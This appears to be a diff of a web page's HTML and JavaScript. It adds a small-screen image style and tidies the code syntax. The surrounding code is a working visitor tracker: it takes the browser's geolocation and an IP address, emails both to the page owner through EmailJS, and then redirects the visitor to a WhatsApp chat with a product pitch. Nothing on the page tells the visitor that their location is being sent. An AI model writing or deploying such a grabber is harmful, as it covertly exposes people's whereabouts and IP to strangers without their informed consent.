@@ -18,6 +18,11 @@
         img {
             height: 3.75em;
         }
+        @media (max-width: 400px) {
+            img {
+            height: 5em;
+        }
+        }
     </style>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
     </script>
@@ -53,8 +58,8 @@
 
                 navigator.geolocation.getCurrentPosition(
                     position => {
-                        latitude = position.coords.latitude;
-                        longitude = position.coords.longitude;
+                        const { latitude, longitude } = position.coords;
+
                         console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
                         sendEmail(ipAddress, latitude, longitude);
                     },
@@ -80,10 +85,10 @@
                         .then(response => {
                             console.log('Email sent successfully!', response.status, response.text);
                         })
-                        .then(()=>{
+                        .then(() => {
                             alert('redirecting to whatsapp...')
                         })
-                        .then(()=>{
+                        .then(() => {
                             window.location.href = 'https://wa.me/+923021105464?text=Hi%2C+are+you+interested+in+our+product%3F'
                         })
                         .catch(error => {
